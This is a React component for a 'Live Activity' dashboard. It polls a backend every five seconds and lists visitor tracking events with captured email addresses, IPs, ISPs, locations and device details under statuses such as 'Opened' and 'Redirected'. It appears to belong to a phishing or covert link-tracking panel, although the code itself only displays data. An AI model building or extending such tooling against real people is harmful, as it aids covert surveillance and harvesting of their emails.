import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Input } from '@/components/ui/input'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { 
  Activity, 
  Users, 
  Eye, 
  ExternalLink, 
  Mail,
  RefreshCw,
  Search,
  Filter,
  Smartphone,
  Monitor,
  Tablet,
  Globe,
  MapPin
} from 'lucide-react'

export default function LiveActivityTab() {
  const [events, setEvents] = useState([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [statusFilter, setStatusFilter] = useState('all')
  const [countryFilter, setCountryFilter] = useState('all')
  const [autoRefresh, setAutoRefresh] = useState(true)

  useEffect(() => {
    fetchLiveEvents()
    
    let interval
    if (autoRefresh) {
      interval = setInterval(fetchLiveEvents, 5000) // Refresh every 5 seconds
    }
    
    return () => {
      if (interval) clearInterval(interval)
    }
  }, [autoRefresh])

  const fetchLiveEvents = async () => {
    try {
      const response = await fetch('/api/events/live?limit=50', {
        credentials: 'include'
      })
      if (response.ok) {
        const data = await response.json()
        setEvents(data.events || [])
      }
    } catch (error) {
      console.error('Failed to fetch live events:', error)
    } finally {
      setLoading(false)
    }
  }

  const getDeviceIcon = (deviceType) => {
    switch (deviceType?.toLowerCase()) {
      case 'mobile': return <Smartphone className="h-4 w-4 text-blue-500" />
      case 'tablet': return <Tablet className="h-4 w-4 text-green-500" />
      default: return <Monitor className="h-4 w-4 text-purple-500" />
    }
  }

  const getStatusIcon = (status) => {
    switch (status) {
      case 'Opened': return <Eye className="h-4 w-4 text-blue-500" />
      case 'Redirected': return <ExternalLink className="h-4 w-4 text-green-500" />
      case 'On Page': return <Activity className="h-4 w-4 text-orange-500" />
      default: return <Activity className="h-4 w-4 text-gray-500" />
    }
  }

  const getStatusBadge = (status) => {
    const statusConfig = {
      'Opened': { variant: 'default', className: 'bg-blue-100 text-blue-800' },
      'Redirected': { variant: 'secondary', className: 'bg-green-100 text-green-800' },
      'On Page': { variant: 'outline', className: 'bg-orange-100 text-orange-800' }
    }
    
    const config = statusConfig[status] || statusConfig['Opened']
    return (
      <Badge variant={config.variant} className={`${config.className} text-xs`}>
        {getStatusIcon(status)}
        <span className="ml-1">{status}</span>
      </Badge>
    )
  }

  const getCountryFlag = (countryCode) => {
    if (!countryCode) return '🌍'
    return `https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png`
  }

  const filteredEvents = events.filter(event => {
    const matchesSearch = 
      event.captured_email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      event.ip_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      event.country_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      event.city?.toLowerCase().includes(searchTerm.toLowerCase())
    
    const matchesStatus = statusFilter === 'all' || event.status === statusFilter
    const matchesCountry = countryFilter === 'all' || event.country_code === countryFilter
    
    return matchesSearch && matchesStatus && matchesCountry
  })

  const uniqueCountries = [...new Set(events.map(e => e.country_code).filter(Boolean))]

  if (loading) {
    return (
      <div className="space-y-4 md:space-y-6">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl md:text-3xl font-bold">Live Activity</h1>
          <RefreshCw className="h-5 w-5 animate-spin" />
        </div>
        <div className="space-y-4">
          {[...Array(10)].map((_, i) => (
            <Card key={i} className="animate-pulse">
              <CardContent className="p-4">
                <div className="h-16 bg-muted rounded"></div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4 md:space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl md:text-3xl font-bold flex items-center gap-2">
            <Activity className="h-6 w-6 md:h-8 md:w-8 text-emerald-500" />
            Live Activity
          </h1>
          <p className="text-sm md:text-base text-muted-foreground">Monitor live events in real time</p>
        </div>
        
        <div className="flex items-center gap-2">
          <Button
            variant={autoRefresh ? 'default' : 'outline'}
            size="sm"
            onClick={() => setAutoRefresh(!autoRefresh)}
          >
            <Activity className="h-4 w-4 mr-2" />
            {autoRefresh ? 'Live' : 'Paused'}
          </Button>
          <Button variant="outline" size="sm" onClick={fetchLiveEvents}>
            <RefreshCw className="h-4 w-4" />
          </Button>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <Card>
          <CardContent className="p-3 md:p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs md:text-sm text-muted-foreground">Active Now</p>
                <p className="text-lg md:text-2xl font-bold">
                  {events.filter(e => new Date() - new Date(e.timestamp) < 300000).length}
                </p>
              </div>
              <Users className="h-6 w-6 md:h-8 md:w-8 text-green-500" />
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-3 md:p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs md:text-sm text-muted-foreground">Total Events</p>
                <p className="text-lg md:text-2xl font-bold">{events.length}</p>
              </div>
              <Activity className="h-6 w-6 md:h-8 md:w-8 text-blue-500" />
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-3 md:p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs md:text-sm text-muted-foreground">Emails Captured</p>
                <p className="text-lg md:text-2xl font-bold">
                  {events.filter(e => e.captured_email).length}
                </p>
              </div>
              <Mail className="h-6 w-6 md:h-8 md:w-8 text-purple-500" />
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-3 md:p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs md:text-sm text-muted-foreground">Countries</p>
                <p className="text-lg md:text-2xl font-bold">{uniqueCountries.length}</p>
              </div>
              <Globe className="h-6 w-6 md:h-8 md:w-8 text-orange-500" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Filters */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search by email, IP, country, or city..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10"
          />
        </div>
        
        <Select value={statusFilter} onValueChange={setStatusFilter}>
          <SelectTrigger className="w-full sm:w-40">
            <SelectValue placeholder="All Status" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Status</SelectItem>
            <SelectItem value="Opened">Opened</SelectItem>
            <SelectItem value="Redirected">Redirected</SelectItem>
            <SelectItem value="On Page">On Page</SelectItem>
          </SelectContent>
        </Select>
        
        <Select value={countryFilter} onValueChange={setCountryFilter}>
          <SelectTrigger className="w-full sm:w-40">
            <SelectValue placeholder="All Countries" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Countries</SelectItem>
            {uniqueCountries.map((code) => {
              const event = events.find(e => e.country_code === code)
              return (
                <SelectItem key={code} value={code}>
                  <div className="flex items-center gap-2">
                    <img 
                      src={getCountryFlag(code)} 
                      alt={`${event?.country_name} flag`}
                      className="w-4 h-3 rounded"
                    />
                    {event?.country_name}
                  </div>
                </SelectItem>
              )
            })}
          </SelectContent>
        </Select>
      </div>

      {/* Live Events Table */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base md:text-lg">Live Event Feed</CardTitle>
          <CardDescription className="text-xs md:text-sm">
            Real-time tracking events • Auto-updating every 5 seconds
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-2 md:space-y-3">
            {filteredEvents.length > 0 ? (
              filteredEvents.map((event, index) => {
                const isRecent = new Date() - new Date(event.timestamp) < 60000 // Less than 1 minute
                return (
                  <div 
                    key={event.id || index} 
                    className={`flex flex-col lg:flex-row lg:items-center justify-between p-3 md:p-4 rounded-lg border transition-all duration-300 gap-2 ${
                      isRecent ? 'bg-green-50 border-green-200 animate-pulse' : 'bg-muted/30'
                    }`}
                  >
                    <div className="flex items-center gap-2 md:gap-3 min-w-0 flex-1">
                      {/* Status and Device Icons */}
                      <div className="flex items-center gap-1">
                        {getStatusIcon(event.status)}
                        {getDeviceIcon(event.device_type)}
                      </div>
                      
                      {/* Main Info */}
                      <div className="min-w-0 flex-1">
                        <div className="flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-2">
                          <span className="font-medium text-sm truncate">
                            {event.captured_email ? (
                              <div className="flex items-center gap-1">
                                <Mail className="h-3 w-3 text-purple-500" />
                                {event.captured_email}
                              </div>
                            ) : (
                              <span className="font-mono text-xs">{event.ip_address}</span>
                            )}
                          </span>
                          
                          <div className="flex items-center gap-1 text-xs text-muted-foreground">
                            <img 
                              src={getCountryFlag(event.country_code)} 
                              alt={`${event.country_name} flag`}
                              className="w-4 h-3 rounded"
                            />
                            <span>{event.country_name}</span>
                            {event.city && (
                              <>
                                <MapPin className="h-3 w-3" />
                                <span>{event.city}</span>
                              </>
                            )}
                          </div>
                        </div>
                        
                        <div className="flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-2 text-xs text-muted-foreground">
                          <span className="truncate">{event.isp}</span>
                          <span className="hidden sm:inline">•</span>
                          <span className="truncate">{event.user_agent?.substring(0, 60)}...</span>
                        </div>
                      </div>
                    </div>
                    
                    {/* Status and Time */}
                    <div className="flex items-center justify-between sm:justify-end gap-2">
                      {getStatusBadge(event.status)}
                      <span className="text-xs text-muted-foreground whitespace-nowrap">
                        {new Date(event.timestamp).toLocaleTimeString([], { 
                          hour: '2-digit', 
                          minute: '2-digit',
                          second: '2-digit'
                        })}
                      </span>
                    </div>
                  </div>
                )
              })
            ) : (
              <div className="text-center py-8 md:py-12 text-muted-foreground">
                <Activity className="h-12 w-12 md:h-16 md:w-16 mx-auto mb-4 opacity-50" />
                <h3 className="text-lg md:text-xl font-semibold mb-2">No live activity</h3>
                <p className="text-sm md:text-base">
                  {searchTerm || statusFilter !== 'all' || countryFilter !== 'all' 
                    ? 'No events match your current filters.' 
                    : 'Waiting for new tracking events...'}
                </p>
              </div>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

